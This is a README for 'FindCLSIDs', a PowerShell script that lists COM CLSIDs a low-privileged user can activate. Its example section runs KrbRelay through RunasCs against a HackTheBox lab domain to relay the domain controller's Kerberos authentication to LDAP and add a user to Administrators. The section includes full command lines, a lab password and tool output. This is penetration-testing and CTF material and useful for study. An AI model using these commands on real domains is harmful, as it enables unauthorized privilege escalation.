# FindCLSIDs
Find CLSIDs of running services that the current user can activate.

Combines [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) with filtering logic by [0xdf](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html#kerberos-relay).

Example Output:
```
*Evil-WinRM* PS C:\temp> .\FindCLSIDs.ps1
Looking for CLSIDs...
Looking for APIDs...
Joining CLSIDs and APIDs...
Testing Running Services for COM Activation...
cdpsvc | {1F3775BA-4FA2-4CA0-825F-5B9EC63C0029} | Failed
CertSvc | {D99E6E73-FC88-11D0-B498-00A0C90312F3} | Activate OK
dps | {7022a3b3-d004-4f52-af11-e9e987fee25f} | Activate OK
dps | {ddcfd26b-feed-44cd-b71d-79487d2e5e5a} | Activate OK
EventSystem | {1BE1F766-5536-11D1-B726-00C04FB926AF} | Activate OK
LicenseManager | {22f5b1df-7d7a-4d21-97f8-c21aefba859c} | Activate OK
netprofm | {A47979D2-C419-11D9-A5B4-001185AD2B89} | Activate OK
profsvc | {BA677074-762C-444b-94C8-8C83F93F6605} | Activate OK
ShellHWDetection | {555F3418-D99E-4E51-800A-6E89CFD8B1D7} | Activate OK
ShellHwDetection | {14E1D985-892F-4F52-A866-6B1AE6A53DFE} | Failed
UsoSvc | {B91D5831-B1BD-4608-8198-D72E155020F7} | Activate OK
vds | {7D1933CB-86F6-4A98-8628-01BE94C9A575} | Activate OK
was | {119817C9-666D-4053-AEDA-627D0E25CCEF} | Activate OK
winmgmt | {8BC3F05E-D86B-11D0-A075-00C04FB68820} | Activate OK
wpnservice | {1FD1B5A7-5C96-4711-A7C3-FFF6D21F93D9} | Activate OK
```
Example exploitation:
```
*Evil-WinRM* PS C:\temp> .\RunasCs.exe m.lovegod 'AbsoluteLDAP2022!' -d absolute.htb -l 9 ".\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid D99E6E73-FC88-11D0-B498-00A0C90312F3 -add-groupmember administrators winrm_user"            
                                                                                                                      
[*] Relaying context: absolute.htb\DC$                                                                                                                                                                                                      
[*] Rewriting function table                                                                                                                                                                                                                
[*] Rewriting PEB                                                                                                                                                                                                                           
[*] GetModuleFileName: System                                                                                         
[*] Init com server                                                                                                   
[*] GetModuleFileName: C:\temp\KrbRelay.exe               
[*] Register com server                                    
objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAACvldWPTxj5ZcXexVcUGYN7AlgAAFwS//8WO695up56kiIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:
                                                                                                                      
[*] Forcing SYSTEM authentication                                                                                     
[*] Using CLSID: d99e6e73-fc88-11d0-b498-00a0c90312f3                                                                 
[*] apReq: 608206b406092a864886f71201020201006e8206a33082069fa003020105a10302010ea20703050020000000a38204e1618204dd308204d9a003020105a10e1b0c4142534f4c5554452e485442a2223020a003020102a11930171b046c6461701b0f64632e6162736f6c7574652e68746
2a382049c30820498a003020112a103020104a282048a04820486401e6378d62aeb0e17c918ca097741209fbf40432a15914d47ce97045df7bf66e4f48643b497d91ebfdc62b3a879d7f6b8f784dab06c21a27fb1da89a476ef4d25fd3dabd083e87309ff723a2e7a64dbad9d15f0469f8556075907d
415742fe952bb433092c2a04477a3a565bac49663434153db5ece921ae7950ae1c7646eb51e1381effcfff112d529aa43e77bee775a0593c6d3fe0c781aa67e25d1705329f6464102ba97d48539766f07097568f7ddf5525061635a26feef2d1bd3d84884253007637ce762e9296b8e3bcfafc731b66
8c2468b7359a49720c9b828e7dcf36029cddfad7ab14d41c4a75828e68ebd8001bf6c68b82005988442e593fad1e11c1b4e76e1623fe3873e54476009328f42dc4033b11199800a9a3b68d777f7fb0c55b350cdf62df2dfe2bc5321cc4a163d975d4a7a17c7d91918c73a2c02a32e47a3929491c8a60
8b880d1e4eebd278b7095a7a79efa7898e5211a031f04ae587ea6affb2a491c7cba9d424ba779609f8e469561363e3953fee57df556fa09e6051be42ae9bb74e4f226c24fd322c07beda310610f8ef5d636873bf3902f3e7cc6d5ee1e72f6902c457febc3fcb3d7f75d5b42b8f6534c556eac47d149c
0a94ab6ce7d7bdb07a1c5e33f4cdf10d103a85ecce57ed6f17954d34158a0aa11d22983297d4453639431177b7ed68ea35f0139858279969382e5ee7016f11e4ef64fbb48e509e36b5351ebb50f162ff4168872ba9e3a54d979ce7fc253e9d14ec0bda1971011143b23415dee2aa8a84b7fa638f1f7d
188c15d99da45f900a4e86b55e0f3db4e780efacc4d37af2f191be77dec4be14b47b278382d3e46d89dd571875d148ff125ef18990e255ea986849e234d21ae759d947815f86ec809df91fbf5b25d14284553b776e3546c1e5b013b161d986a881b524b6e742b0919aa852904ae7530c5891585c7d06
73dd0d348d46867bf3448ee56ebf6266085ed51cda408cbf9fac53126654c09fd5fa5522d9fca3096c16d7ae105431c85a90c255a571a062b00ced84ea4d4fdf305e96d81389be7ec09b4c657d37b86686ed3afb4db25a46c6d09b879081f5eef07e084ee8b00ed44077876f3880fd92f81805c4416c
e1e7b3bd792c3fe4108f46ca3dca04521781b61f195ccb6649e730bb6299a0b01a47111811785ae0a6a6dc54160bd1362375b32b7249e3c8e894b2485e590c4e78f96329978c52b9d73c573d5d055297210bf531051b2140732fc0e0451cfceb84c0dd069818211499d1597abe9ff12a4b3e8447a902
faa177024ac40ff0ffa4e1f894a884dd0f9d2cb34e3cc871028574a9d9ef2cd9d9aea42fcd6d5a410de1bf09978ae8e7ac81a7c607b134096e2100b49a7a5c843b0d8c63a8867d496f7003cbf27aabef82679b2da9f323dcd112fcee55467b7cc47feb9a3338babc8c9f43e4ab093a6b307dd4bbf4a0
64177f46b909fcc57145890fb5220d818e3d10b383262354ce35f74e157a5d81af7fd7ef84f5673b36d6e3d6ee708879e4b0294c5ce43be89b31bc070f26004cddab341fe2a9906e27294dabe4c7275028126309136d81f816f3094debd012a0eef04d5a3546dc07c5fe4d63f56efe3dd672f4f0f4e9
7e006ff86a48201a33082019fa003020112a28201960482019217c316423e994332dc4e633a2ac9d9c1be86ad3a458ece3484e79586cda54c442b13f8ab2cdec9be9163d8d1ff0fef132f476d7e4ba1480308478ef5a7b5f3150584b153b187d2f4918c722ca2829dd253b542fdcd7b0497f93387d78
7d053851f9e99c9f0a824f464b839c5b94bfd2948adff9c7da110eb61b8e8a7eed39db1154d06445b270679853ad308bdf713b6eedf8016ffbaa9140030b8b7940670fcca4c0c51c346c7bac98eb18eca549d80c7bedc4856d108bc0ca371f8812bb1da9d31c10439fe0bfbcdd7288691a2dcfadeb4f
59b4846c5ae02a3c678634bc8e57134620b7198c9a781c64c61772bde34d9c2e25fc5f6c954c5698fa544e43842132339e8b220aa32a57d0e4f9f986988ac2117c5b9412f37e0ed6cfbde0afe042cea5810a3558d6b291353fc2e52e4d7ade84c0dc48d7ed8e663a39bcf7695895cb6b54b603755693
033d9d82bbdc586999d71505cd691d73d180073448fa1559f8094e38191d78a63f3abce9056db85413bc0db9de632a63351033e8b1d5aa7bed6d277df6fa7682d05bb30871c65cd240c
[*] bind: 0                                                                                                                                                                                                                                 
[*] ldap_get_option: LDAP_SASL_BIND_IN_PROGRESS                                                                                                                                                                                             
[*] apRep1: 6f8188308185a003020105a10302010fa2793077a003020112a270046e255f6d768d01b96474b05aa577d997acf658f25f2a4576949ede1eb9236fd7d275fbc59ee7b610dc2852dc9b81b62692e1a61a7636fd4bce26e43e03b02f975d6e0afa327b7fc65d9b307e133e80a0f33f1403
b124b179cc345455cd0d8b248af4287bc9ed208c2ba67668c1f9e5                                                                                                                                                                                      
[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED                                                                                                                                                                                            
[*] fContextReq: Delegate, MutualAuth, UseDceStyle, Connection                                                                                                                                                                              
[*] apRep2: 6f5a3058a003020105a10302010fa24c304aa003020112a2430441c580414065b36fa01d80f050a8f2b983ca9d020b91a406989887bac677a09a1a1df7e8b5d9a7b63543489bd68551fc34716600ba7f1bceecd54510f026c99fffcb
[*] bind: 0                                                                                                                                                                                                                                 
[*] ldap_get_option: LDAP_SUCCESS                                                                                                                                                                                                           
[+] LDAP session established                                                                                                                                                                                                                
[*] ldap_modify: LDAP_SUCCESS 
```
Verify:
```
*Evil-WinRM* PS C:\temp> net user winrm_user
User name                    winrm_user
Full Name
Comment                      Used to perform simple network tasks
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/9/2022 12:25:51 AM
Password expires             Never
Password changeable          6/10/2022 12:25:51 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   3/1/2026 8:49:22 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
Global Group memberships     *Domain Users         *Protected Users
The command completed successfully.
```

